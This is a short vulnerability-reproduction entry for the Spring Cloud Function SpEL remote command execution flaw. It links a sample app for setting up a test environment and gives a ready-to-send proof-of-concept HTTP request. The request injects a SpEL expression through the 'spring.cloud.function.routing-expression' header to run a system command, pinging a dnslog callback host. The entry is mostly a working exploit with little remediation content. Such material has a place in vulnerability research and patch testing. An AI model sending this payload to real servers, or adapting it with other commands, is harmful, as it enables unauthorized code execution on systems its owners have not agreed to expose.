# Spring Cloud Function SPEL Remote Command Execution Vulnerability

## Vulnerability Description

Spring Cloud Function is a Spring Boot-based functional computing framework that abstracts all transport details and infrastructure, allowing developers to retain all familiar tools and processes, and focus on business logic. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Spring Cloud Function </span>

## Environment construction

```php
https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo
```

## Vulnerability reappears

After building, visit

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648445963507-0e8edf45-ca97-444a-b9f2-6e1ce7a1c838.png)

Send POC

```php
POST /functionRouter HTTP/1.1
Host: 192.168.1.27:9000
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 dxytoy.dnslog.cn")
Content-Length: 1
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648446987819-85f1a250-ed53-4794-9168-286030887cc4.png)